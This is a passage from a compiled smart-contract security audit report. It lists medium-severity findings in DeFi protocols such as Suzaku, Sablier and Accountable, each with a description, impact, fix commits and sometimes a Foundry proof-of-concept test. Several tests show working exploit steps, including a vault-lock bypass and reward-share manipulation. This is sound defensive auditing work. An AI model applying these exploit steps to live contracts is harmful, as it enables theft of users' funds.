            owner,                          // protocol fee recipient
            payable(address(middleware)),   // middleware (oracle)
            address(uptimeTracker),         // uptime oracle
            1000,                           // protocol   10%
            2000,                           // operators  20%
            1000,                           // curators   10%
            11_520                          // min uptime (seconds)
        );

        // set up roles --------------------------------------------------------
        vm.prank(owner);
        rewards.setRewardsManagerRole(REWARDS_MANAGER_ROLE);

        vm.prank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR_ROLE);

        // create & fund mock reward token ------------------------------------
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 1e18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 1_000_000 * 1e18);

        // schedule 10 epochs of 100 000 tokens each ---------------------------
        vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(1, 10, address(rewardsToken), 100_000 * 1e18);

        // 100 % of rewards go to the primary asset-class (id 1) ---------------
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForAssetClass(1, 10000); // 10 000 bp == 100 %
        vm.stopPrank();
    }
}
```
**Output:**
```bash
Ran 1 test for test/middleware/PoCMissingLockingRewards.t.sol:PoCMissingLockingRewards
[PASS] test_PoCRewardsManipulated() (gas: 8408423)
Logs:
  Warping to a fresh epoch
  Creating 4 nodes for Alice with the same stake
  Creating 1 node for Charlie with the full stake
  Removing Alice's unbacked nodes at the earliest possible moment
  Advancing and caching stakes
  Marking everyone as fully up for the epoch
  Advancing 3 epochs so rewards can be distributed
  Distributing rewards
  Verifying that the share accounting exceeds 100 %
  Claiming rewards

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.83ms (2.29ms CPU time)

Ran 1 test suite in 133.94ms (5.83ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** * **Lock stake as soon as a node is created**

  ```solidity
  // inside addNode(), after newStake is finalised
  operatorLockedStake[operator] += newStake;
  ```

  Unlock (subtract) it in `_initializeEndValidationAndFlag()` and whenever `_initializeValidatorStakeUpdate()` lowers the node’s stake.

**Suzaku:**
Fixed in commit [d3f80d9](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d3f80d9d3830deda5012eca6f4356b02ad768868).

**Cyfrin:** Verified.

## [M-18] Operators can lose their reward share
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `Rewards::distributeRewards` function distributes rewards for epochs that are at least two epochs older than the current one. However, when calculating and distributing these rewards, the contract fetches the list of operators using `l1Middleware.getAllOperators()`, which returns the current set of operators. If an operator was active during the target epoch but has since been disabled and removed before the rewards distribution, they will not be included in the current operator list. This can occur if the `SLASHING_WINDOW` in `AvalancheL1Middleware` is shorter than `2 * epochDuration`.

**Impact:** Operators who were legitimately active and eligible for rewards in a given epoch may lose their rewards if they are disabled and removed before the rewards distribution occurs. This allows the contract owner (or any entity with the authority to remove operators) to manipulate the operator set and exclude operators from receiving rewards for epochs in which they were still enabled (intentionally or not), resulting in unfair loss of rewards and potential trust issues in the protocol.

**Proof of Concept:**
1. Change the `MockAvalancheL1Middleware.sol` to:
```solidity
// SPDX-License-Identifier: MIT
// SPDX-FileCopyrightText: Copyright 2024 ADDPHO

pragma solidity 0.8.25;

contract MockAvalancheL1Middleware {
    uint48 public constant EPOCH_DURATION = 4 hours;
    uint48 public constant SLASHING_WINDOW = 5 hours;
    address public immutable L1_VALIDATOR_MANAGER;
    address public immutable VAULT_MANAGER;

    mapping(uint48 => mapping(bytes32 => uint256)) public nodeStake;
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;
    mapping(uint48 => mapping(address => mapping(uint96 => uint256))) public operatorStake;
    mapping(address asset => uint96 assetClass) public assetClassAsset;

    // Replace constant arrays with state variables
    address[] private OPERATORS;
    bytes32[] private VALIDATION_ID_ARRAY;

    // Add mapping from operator to their node IDs
    mapping(address => bytes32[]) private operatorToNodes;

    // Track operator status
    mapping(address => bool) public isEnabled;
    mapping(address => uint256) public disabledTime;

    uint96 primaryAssetClass = 1;
    uint96[] secondaryAssetClasses = [2, 3];

    constructor(
        uint256 operatorCount,
        uint256[] memory nodesPerOperator,
        address balancerValidatorManager,
        address vaultManager
    ) {
        require(operatorCount > 0, "At least one operator required");
        require(operatorCount == nodesPerOperator.length, "Arrays length mismatch");

        L1_VALIDATOR_MANAGER = balancerValidatorManager;
        VAULT_MANAGER = vaultManager;

        // Generate operators
        for (uint256 i = 0; i < operatorCount; i++) {
            address operator = address(uint160(0x1000 + i));
            OPERATORS.push(operator);
            isEnabled[operator] = true; // Initialize as enabled

            uint256 nodeCount = nodesPerOperator[i];
            require(nodeCount > 0, "Each operator must have at least one node");

            bytes32[] memory operatorNodes = new bytes32[](nodeCount);

            for (uint256 j = 0; j < nodeCount; j++) {
                bytes32 nodeId = keccak256(abi.encode(operator, j));
                operatorNodes[j] = nodeId;
                VALIDATION_ID_ARRAY.push(nodeId);
            }

            operatorToNodes[operator] = operatorNodes;
        }
    }

    function disableOperator(address operator) external {
        require(isEnabled[operator], "Operator not enabled");
        disabledTime[operator] = block.timestamp;
        isEnabled[operator] = false;
    }

    function removeOperator(address operator) external {
        require(!isEnabled[operator], "Operator is still enabled");
        require(block.timestamp >= disabledTime[operator] + SLASHING_WINDOW, "Slashing window not passed");

        // Remove operator from OPERATORS array
        for (uint256 i = 0; i < OPERATORS.length; i++) {
            if (OPERATORS[i] == operator) {
                OPERATORS[i] = OPERATORS[OPERATORS.length - 1];
                OPERATORS.pop();
                break;
            }
        }
    }

    function setTotalStakeCache(uint48 epoch, uint96 assetClass, uint256 stake) external {
        totalStakeCache[epoch][assetClass] = stake;
    }

    function setOperatorStake(uint48 epoch, address operator, uint96 assetClass, uint256 stake) external {
        operatorStake[epoch][operator][assetClass] = stake;
    }

    function setNodeStake(uint48 epoch, bytes32 nodeId, uint256 stake) external {
        nodeStake[epoch][nodeId] = stake;
    }

    function getNodeStake(uint48 epoch, bytes32 nodeId) external view returns (uint256) {
        return nodeStake[epoch][nodeId];
    }

    function getCurrentEpoch() external view returns (uint48) {
        return getEpochAtTs(uint48(block.timestamp));
    }

    function getAllOperators() external view returns (address[] memory) {
        return OPERATORS;
    }

    function getOperatorUsedStakeCachedPerEpoch(
        uint48 epoch,
        address operator,
        uint96 assetClass
    ) external view returns (uint256) {
        if (assetClass == 1) {
            bytes32[] storage nodesArr = operatorToNodes[operator];
            uint256 stake = 0;

            for (uint256 i = 0; i < nodesArr.length; i++) {
                bytes32 nodeId = nodesArr[i];
                stake += this.getNodeStake(epoch, nodeId);
            }
            return stake;
        } else {
            return this.getOperatorStake(operator, epoch, assetClass);
        }
    }

    function getOperatorStake(address operator, uint48 epoch, uint96 assetClass) external view returns (uint256) {
        return operatorStake[epoch][operator][assetClass];
    }

    function getEpochAtTs(uint48 timestamp) public pure returns (uint48) {
        return timestamp / EPOCH_DURATION;
    }

    function getEpochStartTs(uint48 epoch) external pure returns (uint256) {
        return epoch * EPOCH_DURATION + 1;
    }

    function getActiveAssetClasses() external view returns (uint96, uint96[] memory) {
        return (primaryAssetClass, secondaryAssetClasses);
    }

    function getAssetClassIds() external view returns (uint96[] memory) {
        uint96[] memory assetClasses = new uint96[](3);
        assetClasses[0] = primaryAssetClass;
        assetClasses[1] = secondaryAssetClasses[0];
        assetClasses[2] = secondaryAssetClasses[1];
        return assetClasses;
    }

    function getActiveNodesForEpoch(address operator, uint48) external view returns (bytes32[] memory) {
        return operatorToNodes[operator];
    }

    function getOperatorNodes(address operator) external view returns (bytes32[] memory) {
        return operatorToNodes[operator];
    }

    function getAllValidationIds() external view returns (bytes32[] memory) {
        return VALIDATION_ID_ARRAY;
    }

    function isAssetInClass(uint256 assetClass, address asset) external view returns (bool) {
        uint96 assetClassRegistered = assetClassAsset[asset];
        if (assetClassRegistered == assetClass) {
            return true;
        }
        return false;
    }

    function setAssetInAssetClass(uint96 assetClass, address asset) external {
        assetClassAsset[asset] = assetClass;
    }

    function getVaultManager() external view returns (address) {
        return VAULT_MANAGER;
    }
}
```

2. Add the following test to the `RewardsTest.t.sol`:
```solidity
function test_distributeRewards_removedOperator() public {
	uint48 epoch = 1;
	uint256 uptime = 4 hours;

	// Set up stakes for operators in epoch 1
	_setupStakes(epoch, uptime);

	// Get the list of operators
	address[] memory operators = middleware.getAllOperators();
	address removedOperator = operators[0]; // Operator to be removed
	address activeOperator = operators[1]; // Operator to remain active

	// Disable operator[0] at the start of epoch 2
	uint256 epoch2Start = middleware.getEpochStartTs(epoch + 1); // T = 8h
	vm.warp(epoch2Start);
	middleware.disableOperator(removedOperator);

	// Warp to after the slashing window to allow removal
	uint256 removalTime = epoch2Start + middleware.SLASHING_WINDOW(); // T = 13h (8h + 5h)
	vm.warp(removalTime);
	middleware.removeOperator(removedOperator);

	// Warp to epoch 4 to distribute rewards for epoch 1
	uint256 distributionTime = middleware.getEpochStartTs(epoch + 3); // T = 16h
	vm.warp(distributionTime);

	// Distribute rewards in batches
	uint256 batchSize = 3;
	uint256 remainingOperators = middleware.getAllOperators().length; // Now 9 operators
	while (remainingOperators > 0) {
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(batchSize));
		remainingOperators = remainingOperators > batchSize ? remainingOperators - batchSize : 0;
	}

	// Verify that the removed operator has zero shares
	assertEq(
		rewards.operatorShares(epoch, removedOperator),
		0,
		"Removed operator should have zero shares despite being active in epoch 1"
	);

	// Verify that an active operator has non-zero shares
	assertGt(
		rewards.operatorShares(epoch, activeOperator),
		0,
		"Active operator should have non-zero shares"
	);
}
```

**Recommended Mitigation:** When distributing rewards for a past epoch, fetch the list of operators who were active during that specific epoch, rather than relying on the current operator list. This can be achieved by maintaining a historical record of operator status per epoch or by querying the operator set as it existed at the target epoch. Additionally, ensure that the `SLASHING_WINDOW` is at least as long as the reward distribution delay (i.e., `SLASHING_WINDOW >= 2 * epochDuration`) to prevent premature removal of operators before their rewards are distributed.

**Suzaku:**
Fixed in commit [dc63daa](https://github.com/suzaku-network/suzaku-core/pull/155/commits/dc63daa5082d17ce4025eee2361fb5d36dee520d).

**Cyfrin:** Verified.

## [M-19] Optimisation of elapsed epoch calculation
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** In the `UptimeTracker::computeValidatorUptime` function, there is an opportunity to optimize how the number of elapsed epochs is calculated.

```solidity
Currently, the code redundantly retrieves both epoch indices and their corresponding start timestamps to compute the elapsed time between epochs:

uint48 lastUptimeEpoch = l1Middleware.getEpochAtTs(uint48(lastUptimeCheckpoint.timestamp));
uint256 lastUptimeEpochStart = l1Middleware.getEpochStartTs(lastUptimeEpoch);

uint48 currentEpoch = l1Middleware.getEpochAtTs(uint48(block.timestamp));
uint256 currentEpochStart = l1Middleware.getEpochStartTs(currentEpoch);

uint256 elapsedTime = currentEpochStart - lastUptimeEpochStart;
uint256 elapsedEpochs = elapsedTime / epochDuration;
```

However, since the epoch numbers themselves are already known (lastUptimeEpoch and currentEpoch), the number of full epochs that have elapsed can be directly calculated by subtracting the epoch indices, avoiding the unnecessary calls to getEpochStartTs.

**Recommended Mitigation:** Replace the timestamp-based epoch duration calculation with a simpler and more efficient version:

```diff
- uint256 elapsedTime = currentEpochStart - lastUptimeEpochStart;
- uint256 elapsedEpochs = elapsedTime / epochDuration;
+ uint256 elapsedEpochs = currentEpoch - lastUptimeEpoch;
```

This change reduces computational overhead and simplifies the logic while achieving the same result.

**Suzaku:**
Fixed in commit [f9946ef](https://github.com/suzaku-network/suzaku-core/commit/f9946ef8f6c7d7ab946e01d906f411352004ee41).

**Cyfrin:** Verified.

## [M-20] Returning true when the current time has reached the `expiration_time` in `is_vacant`
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** `is_vacant` is used in `deposit` and `new_private_client`. In deposit function, we check whether the user is a private client and `is_vacant` is false, meaning the record has not expired. In `new_private_client`, we check whether `is_vacant` returns true, meaning the record is vacant or has expired.
```rust
    pub fn is_vacant(&self, current_time: u32) -> bool {
        self.creation_time == 0 || current_time > self.expiration_time
    }
```

In `is_vacant`, we check whether the current time is greater than the expiration time. If the current time is equal to the expiration time, the function still returns false.

**Impact:** `is_vacant` allows an expired private client to deposit, and in `new_private_client` we do not update the record at the index even when the current time has reached the expiration.

**Recommended Mitigation:** `is_vacant` should return true when the current time is equal to the expiration time:
```rust
    pub fn is_vacant(&self, current_time: u32) -> bool {
        self.creation_time == 0 || current_time >= self.expiration_time
    }
```

**Deriverse:** Fixed in commit [408cd2](https://github.com/deriverse/protocol-v1/commit/408cd20e1339196735c2bed19e211fa4dddd931b).

**Cyfrin:** Verified.

## [M-21] Meta transactions will not work due to direct msg.sender usage in validate Locked Tokens
- Severity: `Medium`
- Source report: `dstokenswap.md`

### Detailed Content (from source)
**Description:** The protocol makes use of `_msgSender()` in several parts and it is understood the protocol team considers possible support of meta transactions where relayers will handle the transactions that are signed by the investors.
But the `validateLockedTokens` function uses `msg.sender` directly to check the available balance for transfer. This prevents the contract from supporting meta transactions since the actual token holder's address would be different from the relayer's address (msg.sender) in a meta transaction context.
```solidity
81  function validateLockedTokens(string memory investorId, uint256 value, IDSRegistryService registryService) private view {
82      IDSComplianceService complianceService = IDSComplianceService(sourceServiceConsumer.getDSService(sourceServiceConsumer.COMPLIANCE_SERVICE()));
83      IDSComplianceConfigurationService complianceConfigurationService = IDSComplianceConfigurationService(sourceServiceConsumer.getDSService(sourceServiceConsumer.COMPLIANCE_CONFIGURATION_SERVICE()));
84
85      string memory country = registryService.getCountry(investorId);
86      uint256 region = complianceConfigurationService.getCountryCompliance(country);
87
88      // lock/hold up validation
89      uint256 lockPeriod = (region == US) ? complianceConfigurationService.getUSLockPeriod() : complianceConfigurationService.getNonUSLockPeriod();
90      uint256 availableBalanceForTransfer = complianceService.getComplianceTransferableTokens(msg.sender, block.timestamp, uint64(lockPeriod));//@audit-issue msg.sender can be different from _msgSender
91      require(availableBalanceForTransfer >= value, "Not enough unlocked balance");
92  }
```
Note that in the function `ComplianceServiceRegulated::getComplianceTransferableTokens()`, the first parameter `_who` is used to get investor info by ` getRegistryService().getInvestor(_who);`.
```solidity
@securitize\digital_securities\contracts\compliance\ComplianceServiceRegulated.sol
658:     function getComplianceTransferableTokens(
659:         address _who,
660:         uint256 _time,
661:         uint64 _lockTime
662:     ) public view override returns (uint256) {
663:         require(_time != 0, "Time must be greater than zero");
664:         string memory investor = getRegistryService().getInvestor(_who);
665:
666:         uint256 balanceOfInvestor = getLockManager().getTransferableTokens(_who, _time);
667:
668:         uint256 investorIssuancesCount = issuancesCounters[investor];
669:
670:         //No locks, go to base class implementation
671:         if (investorIssuancesCount == 0) {
672:             return balanceOfInvestor;
673:         }
674:
675:         uint256 totalLockedTokens = 0;
676:         for (uint256 i = 0; i < investorIssuancesCount; i++) {
677:             uint256 issuanceTimestamp = issuancesTimestamps[investor][i];
678:
679:             if (uint256(_lockTime) > _time || issuanceTimestamp > (_time - uint256(_lockTime))) {
680:                 totalLockedTokens = totalLockedTokens + issuancesValues[investor][i];
681:             }
682:         }
683:
684:         //there may be more locked tokens than actual tokens, so the minimum between the two
685:         uint256 transferable = balanceOfInvestor - Math.min(totalLockedTokens, balanceOfInvestor);
686:
687:         return transferable;
688:     }
```
In other parts, `msg.sender` and `_msgSender()` are being used correctly to handle the meta transactions.

**Impact:** For meta transactions, `getComplianceTransferableTokens` will return incorrect value because `msg.sender` is not necessarily the investor. Users would always need to have ETH to pay for gas, which defeats one of the main benefits of meta transactions where users could have their transactions relayed by others.

**Recommended Mitigation:** Use `_msgSender()` instead of using `msg.sender` in the specific part as belows.

```diff
    function validateLockedTokens(string memory investorId, uint256 value, IDSRegistryService registryService) private view {
        IDSComplianceService complianceService = IDSComplianceService(sourceServiceConsumer.getDSService(sourceServiceConsumer.COMPLIANCE_SERVICE()));
        IDSComplianceConfigurationService complianceConfigurationService = IDSComplianceConfigurationService(sourceServiceConsumer.getDSService(sourceServiceConsumer.COMPLIANCE_CONFIGURATION_SERVICE()));

        string memory country = registryService.getCountry(investorId);
        uint256 region = complianceConfigurationService.getCountryCompliance(country);

        // lock/hold up validation
        uint256 lockPeriod = (region == US) ? complianceConfigurationService.getUSLockPeriod() : complianceConfigurationService.getNonUSLockPeriod();//@audit-info assume these values are representing time duration in seconds
--        uint256 availableBalanceForTransfer = complianceService.getComplianceTransferableTokens(msg.sender, block.timestamp, uint64(lockPeriod));
++        uint256 availableBalanceForTransfer = complianceService.getComplianceTransferableTokens(_msgSender(), block.timestamp, uint64(lockPeriod));

        require(availableBalanceForTransfer >= value, "Not enough unlocked balance");
    }
```

**Securitize:** Fixed in commit [b26a16](https://bitbucket.org/securitize_dev/bc-dstoken-class-swap-sc/commits/b26a167524dfa96fc92dc18a863998a50e533bf2).

**Cyfrin:** Verified.


\clearpage

## [M-22] Don't copy entire struct from `storage` to `memory` when only few fields required
- Severity: `Medium`
- Source report: `escrow.md`

### Detailed Content (from source)
**Description:** Don't copy entire struct from `storage` to `memory` when only few fields required:

* `SablierBobState::_statusOf`
```diff
-        Bob.Vault memory vault = _vaults[vaultId];
+        Bob.Vault storage vault = _vaults[vaultId];
```

* `SablierEscrowState::_statusOf`
```solidity
    function _statusOf(uint256 orderId) internal view returns (Escrow.Status) {
        // @audit more efficient implementation
        // get storage reference
        Escrow.Order storage order = _orders[orderId];

        // 1 SLOAD
        (bool wasFilled, bool wasCanceled, uint40 expiryTime)
            = (order.wasFilled, order.wasCanceled, order.expiryTime);

        if (wasFilled) {
            return Escrow.Status.FILLED;
        }
        if (wasCanceled) {
            return Escrow.Status.CANCELLED;
        }

        // Return EXPIRED if the order has an expiry timestamp and it has expired.
        if (expiryTime != 0 && block.timestamp >= expiryTime) {
            return Escrow.Status.EXPIRED;
        }

        return Escrow.Status.OPEN;
    }
```

* `SablierEscrow::cancelOrder` - similar improvements to the previous by getting a `storage` reference then loading the first slot in 1 SLOAD

* `SablierEscrow::fillOrder` - potentially also better to use a `storage` reference then only read from storage required slots, to prevent duplicating storage reads already done inside the call to `_statusOf`

* `SablierBob::enter` - only needs `vault.adapter, vault.token, vault.shareToken`

**Sablier:** Fixed in commits [bc5d883](https://github.com/sablier-labs/lockup/commit/bc5d8839130b07cecaff64df591bc27fdbd8f374), [48f25c4](https://github.com/sablier-labs/lockup/commit/48f25c4c99a304b016650c5e2cdeda3bd96647bd), [PR1444](https://github.com/sablier-labs/lockup/pull/1444/changes).

**Cyfrin:** Verified; the fixes aren't exactly as recommended but still more efficient than the original implementations.

## [M-23] Users can bypass vault lock and withdraw at any time
- Severity: `Medium`
- Source report: `escrow.md`

### Detailed Content (from source)
**Description:** A user can bypass the vault lock to withdraw at any time by:
- Transferring their `BobVaultShare` to a different address
- Calling `SablierBob::enter` from the new address with a small amount of additional tokens
- Calling `SablierBob::exitWithinGracePeriod` from the new address to withdraw the total balance including the originally locked deposit

This works because `exitWithinGracePeriod` (`SablierBob.sol:237-287`) only checks that the caller has a `_firstDepositTimes` entry and is within the grace period. It burns the caller's entire share balance (line 248), not just the amount they deposited:

```solidity
uint128 amount = vault.shareToken.balanceOf(msg.sender).toUint128();
```

When the new address calls `enter` with even 1 wei, it gets a fresh `_firstDepositTimes` entry (line 213-215). Combined with the transferred shares, `exitWithinGracePeriod` then burns and returns everything.

**Impact:** The vault's purpose is to lock tokens until a price target is reached or the expiry passes. This bypass completely defeats the lock mechanism — any user can withdraw at any time while the vault is still ACTIVE, at the cost of 1 additional token. This undermines the core value proposition of the protocol.

**Proof of Concept:** Add the following test to `tests/bob/integration/concrete/exit-within-grace-period/exitWithinGracePeriodPoC.t.sol`:

```solidity
/// A user can bypass the vault lock by:
/// 1. Transferring BobVaultShare to a different address
/// 2. Calling enter from the new address with a small amount
/// 3. Calling exitWithinGracePeriod to withdraw everything including the locked deposit
function test_PoC_BypassVaultLock() external {
    uint256 vaultId = createDefaultVault();
    uint128 depositAmount = DEPOSIT_AMOUNT; // 10_000e18

    // User A deposits into the vault
    setMsgSender(users.depositor);
    bob.enter(vaultId, depositAmount);
    IERC20 shareToken = IERC20(address(bob.getShareToken(vaultId)));
    assertEq(shareToken.balanceOf(users.depositor), depositAmount, "A has shares");

    // Grace period expires - user A should be locked in
    vm.warp(block.timestamp + 4 hours + 1);

    // Verify A can no longer exit via grace period
    uint40 depositedAt = bob.getFirstDepositTime(vaultId, users.depositor);
    uint40 gracePeriodEnd = depositedAt + 4 hours;
    vm.expectRevert(
        abi.encodeWithSelector(
            Errors.SablierBob_GracePeriodExpired.selector, vaultId, users.depositor, depositedAt, gracePeriodEnd
        )
    );
    bob.exitWithinGracePeriod(vaultId);

    // A transfers all shares to address B (same person, different address)
    shareToken.transfer(users.depositor2, depositAmount);
    assertEq(shareToken.balanceOf(users.depositor), 0, "A transferred all shares");
    assertEq(shareToken.balanceOf(users.depositor2), depositAmount, "B received shares");

    // B deposits 1 wei to get a fresh _firstDepositTimes entry
    setMsgSender(users.depositor2);
    bob.enter(vaultId, 1);

    // B now has all shares + 1 and a fresh grace period
    assertEq(shareToken.balanceOf(users.depositor2), depositAmount + 1, "B has all shares + 1");

    // B exits within grace period - withdraws EVERYTHING including A's locked deposit
    uint256 tokenBalanceBefore = dai.balanceOf(users.depositor2);
    bob.exitWithinGracePeriod(vaultId);
    uint256 tokensReceived = dai.balanceOf(users.depositor2) - tokenBalanceBefore;

    // B received the full amount: the originally locked deposit + 1 wei
    assertEq(tokensReceived, depositAmount + 1, "EXPLOIT: withdrew all tokens including locked deposit");
    assertEq(shareToken.balanceOf(users.depositor2), 0, "B has no shares left");
}
```

Run with: `forge test --match-test test_PoC_BypassVaultLock -vvv`

**Recommended Mitigation:** Track the original deposit amount per user and only allow exiting with up to that amount during the grace period:
```solidity
mapping(uint256 vaultId => mapping(address user => uint128 depositedAmount)) internal _userDeposits;
```

In `exitWithinGracePeriod`, use `min(shareBalance, _userDeposits[vaultId][msg.sender])` instead of the full share balance.

**Sablier:** Fixed in commit [74fa619](https://github.com/sablier-labs/lockup/commit/74fa619471e00958b6b922f8b6c4d9bb95ccc37a) by removing the early exit grace period functionality.

**Cyfrin:** Verified.

## [M-24] `Pledge Manager::refund Tokens` doesn't decrement `tokens Sold` when pledge hasn't concluded, preventing pledge from reaching its funding goal
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `PledgeManager::refundTokens` doesn't decrement `tokensSold` when pledge hasn't concluded.

**Impact:** The pledge will be prevented from reaching its funding goal since the refunded tokens can't be purchased by other users.

**Recommended Mitigation:** `PledgeManager::refundTokens` should always decrement `tokensSold`:
```diff
        if (
            !pledgeRoundConcluded &&
            SafeCast.toUint32(block.timestamp) < deadline
        ) {
            refundAmount -= (refundAmount * earlySellPenalty) / 1e6;
            _propertyToken.adminTransferFrom(
                signer,
                holderWallet,
                numTokens,
                false,
                false
            );
            emit TokensUnPledged(signer, numTokens);
        } else {
            fee = (userPay.fee / userPay.tokensBought) * numTokens;
            _propertyToken.burnFrom(signer, numTokens);
            emit TokensRefunded(signer, numTokens);
-           tokensSold -= numTokens;
        }

+      tokensSold -= numTokens;
```

**Remora:** Fixed in commit [6be4660](https://github.com/remora-projects/remora-smart-contracts/commit/6be4660990ebafbb7200425978f078a0865732fe).

**Cyfrin:** Verified.

## [M-25] Variables in non-upgradeable contracts which are only set once in `constructor` should be declared `immutable`
- Severity: `Medium`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** Variables in non-upgradeable contracts which are only set once in `constructor` should be declared `immutable`:
* `PledgeManager::holderWallet`, `propertyToken`, `stablecoin`, `stablecoinDecimals`, `deadline`, `postDeadlineWithdrawPeriod`, `pricePerToken`

**Remora:** Fixed in commit [afd07fb](https://github.com/remora-projects/remora-smart-contracts/commit/afd07fb419c354dc223d0105b2fd0c5d565f465f).

**Cyfrin:** Verified.

## [M-26] `Accountable Open Term` rate publish/rollback does not refresh delinquency status
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** In `AccountableOpenTerm`, the new rate update flows (`publishRate()` / `rollbackRate()`) call `_accrueInterest()` and then update core economic parameters (e.g., `interestRate`, scale-factor–related state, and accrual timestamps). However, these functions do not call `_updateDelinquentStatus()` after mutating the loan’s economic state.

**Impact:** Delinquency status can remain stale until a later interaction triggers `_updateDelinquentStatus()`. This can cause temporary inconsistencies in delinquency tracking and penalty timing, and may affect monitoring/automation that relies on delinquency state immediately after rate changes.

**Recommended Mitigation:** Call `_updateDelinquentStatus()` at the end of both `publishRate()` and `rollbackRate()` so delinquency state always reflects the latest rate/accrual state.

**Accountable:** Fixed in commits [`39c60c7`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/39c60c7c2ceaf4a7de87013aeb27acabbff088b5) and [`f350a8d`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/f350a8dc1769f9401b4d1ef62d3748540545ca4d).

**Cyfrin:** Verified. `_updateDelinquentStatus()` now called from both `publishRate()` and `rollbackRate()`.

## [M-27] `Accountable Yield::repay` vs `publish Rate` transaction ordering can undo repayment accounting
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** `AccountableYield::repay` reduces `deployedAssets` based on the repaid amount:

```solidity
uint256 deployed = deployedAssets;
deployedAssets -= Math.min(remaining, deployed);
```

But `publishRate(uint256 newDeployedValue)` later overwrites `deployedAssets` with the DVN-reported value:

```solidity
uint256 oldValue = deployedAssets;
deployedAssets = newDeployedValue;
```

Because these are independent transactions, ordering matters. If `repay()` executes first (reducing `deployedAssets`), and then `publishRate()` executes with a value that still reflects the pre-repayment NAV, the overwrite can effectively “reverse” the accounting effect of the borrower’s repayment by setting `deployedAssets` back up.

**Impact:** Transaction ordering can materially change outcomes. In congested conditions, a DVN update can effectively “undo” the accounting effect of a borrower repayment by resetting `deployedAssets` upward, impacting reported NAV/share price, fee accrual, and whether the loan can reach a fully repaid state. This risk is amplified when the NAV grace period is configured to be short (default is 24h, but it can be as low as 1h), increasing the frequency/urgency of updates and making collisions more likely. It is further increased by the DVNPublisher’s async publish/execute flow, since there is an inherent delay between when a value is proposed and when it is executed on-chain, making it more likely that repayments occur in between.

**Recommended Mitigation:** `DVNPublisher.PublishRequest` already includes a `timestamp`, pass that through to `AccountableYield.publishRate` (e.g., `publishRate(uint256 value, uint256 measuredAt)`) and store `lastNavMeasuredAt`. Reject/ignore updates with `measuredAt <= lastNavMeasuredAt` and/or `measuredAt < lastRepayTime` so a stale snapshot cannot overwrite newer repayment accounting.


**Accountable:** Fixed in commits [`5b6498a`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/5b6498af30c542f93118e5d05206b70aeeb3b17f), [`6756c97`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/6756c97db4aa2595045576bada90ba0705bb2f03) and [`06b6c4c`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/06b6c4c0238f8241a440861a578f1e6a701ff4b8)

**Cyfrin:** Verified. Code now compares to the timestamp of the measurement, if the value is a mean of the two middle measurements, the older timestamp is used.

## [M-28] `DVNPublisher::publish` does not enforce a maximum age for updates
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** `DVNPublisher::publish` validates that `request.timestamp` is not in the future, but it does not enforce a maximum age (i.e., it does not reject requests that are already stale at submission time). Staleness is only handled later during `DVNPublisher::execute`.

Consider adding a check in `publish()` to reject already-stale requests, e.g. `require(request.timestamp + maxStaleness >= block.timestamp)`, to reduce clutter in `_pendingRequests`.

**Accountable:** Fixed in commit [`5afc5fd`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/5afc5fd48b7ee0e2649c46e6c1dd261f9e00de49)

**Cyfrin:** Verified.

## [M-29] Cancelling a later-batch request in `Accountable Open Term` can delay earlier withdrawals
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** The Vault allows cancelling any queued redeem request via `AccountableAsyncRedeemVault::cancelRedeemRequest(controller, receiver)`, which removes that controller’s queued shares.

To keep batching metadata in sync, the Vault calls the strategy hook `AccountableOpenTerm::onCancelRedeemRequest(...)`. However, the strategy reduces batch totals starting from `pendingBatch` (oldest batch) and walks forward, without knowing which batch the cancelled request actually belonged to:

```solidity
uint256 batch = pendingBatch;
...
while (shares > 0 && batch <= maxBatch && maxIter > 0) {
    uint256 batchShares = _withdrawalBatches[batch].totalShares;
    if (batchShares >= shares) {
        _withdrawalBatches[batch].totalShares -= shares;
        break;
    } else {
        _withdrawalBatches[batch].totalShares = 0;
        shares -= batchShares;
        batch++;
    }
    --maxIter;
}
```

If a user cancels a request that was created in a later batch, this logic subtracts the cancelled shares from the earliest batch’s `totalShares`. That can make `pendingBatch.totalShares` smaller than the actual FIFO-queued shares at the head of the Vault queue.

During processing, the strategy limits processing by `min(queueMaxShares, batch.totalShares)` and stops once it reaches the next (not-yet-expired) batch.

**Impact:** Queued withdrawals that should be eligible (earlier batch already expired and liquidity exists) can be artificially delayed until a later batch expires, because the strategy advances to a future batch while some earlier-batch shares still remain in the queue head. This can degrade withdrawal liveness and create unexpected waiting periods for lenders.

**Proof of Concept:** Add the following test to `test/strategies/AccountableOpenTermBatch.t.sol`:
```solidity
function test_cancelFromFutureBatch_canDelayEarlierBatchProcessing() public {
    _setupLoanWithBatches(4 days, 7 days);

    // Three lenders deposit, borrower borrows everything (no immediate liquidity).
    vm.prank(alice);
    usdcOpenTermVault.deposit(USDC_AMOUNT, alice, alice);
    vm.prank(bob);
    usdcOpenTermVault.deposit(USDC_AMOUNT, bob, bob);
    vm.prank(charlie);
